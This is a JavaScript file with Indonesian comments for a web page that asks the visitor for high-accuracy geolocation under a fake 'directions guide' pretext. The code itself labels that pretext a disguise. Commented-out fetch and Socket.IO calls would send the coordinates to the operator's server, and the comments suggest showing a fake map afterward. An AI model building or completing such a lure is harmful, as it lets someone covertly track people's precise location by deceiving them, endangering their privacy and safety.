document.getElementById("allowLocation").addEventListener("click", function () {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
      enableHighAccuracy: true,
      timeout: 10000, // 10 detik
      maximumAge: 0,
    });
  } else {
    alert("Geolocation tidak didukung oleh browser ini.");
  }
});

function successCallback(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const accuracy = position.coords.accuracy;

  console.log("Lokasi berhasil didapatkan:", latitude, longitude);

  // Kirim data lokasi ke server Anda (ini akan diimplementasikan setelah setup backend)
  // Contoh: menggunakan Fetch API atau Socket.IO
  // fetch('/send-location', {
  //     method: 'POST',
  //     headers: {
  //         'Content-Type': 'application/json'
  //     },
  //     body: JSON.stringify({ latitude, longitude, accuracy })
  // })
  // .then(response => response.json())
  // .then(data => console.log('Lokasi terkirim:', data))
  // .catch(error => console.error('Gagal mengirim lokasi:', error));

  // Jika menggunakan Socket.IO:
  // socket.emit('sendLocation', { latitude, longitude, accuracy });

  alert(
    "Terima kasih, panduan arah akan segera ditampilkan (ini hanya penyamaran).",
  );
  // Di sini Anda bisa mengarahkan ke halaman lain, atau menampilkan peta palsu
  // window.location.href = "https://www.google.com/maps/search/?api=1&query=" + latitude + "," + longitude;
}

function errorCallback(error) {
  let errorMessage = "Gagal mendapatkan lokasi. ";
  switch (error.code) {
    case error.PERMISSION_DENIED:
      errorMessage += "Pengguna menolak permintaan Geolocation.";
      break;
    case error.POSITION_UNAVAILABLE:
      errorMessage += "Informasi lokasi tidak tersedia.";
      break;
    case error.TIMEOUT:
      errorMessage += "Waktu permintaan lokasi habis.";
      break;
    case error.UNKNOWN_ERROR:
      errorMessage += "Terjadi kesalahan yang tidak diketahui.";
      break;
  }
  console.error(errorMessage);
  alert(
    "Maaf, kami tidak bisa mendapatkan lokasi Anda. Mungkin ada masalah jaringan atau izin lokasi tidak diberikan.",
  );
}
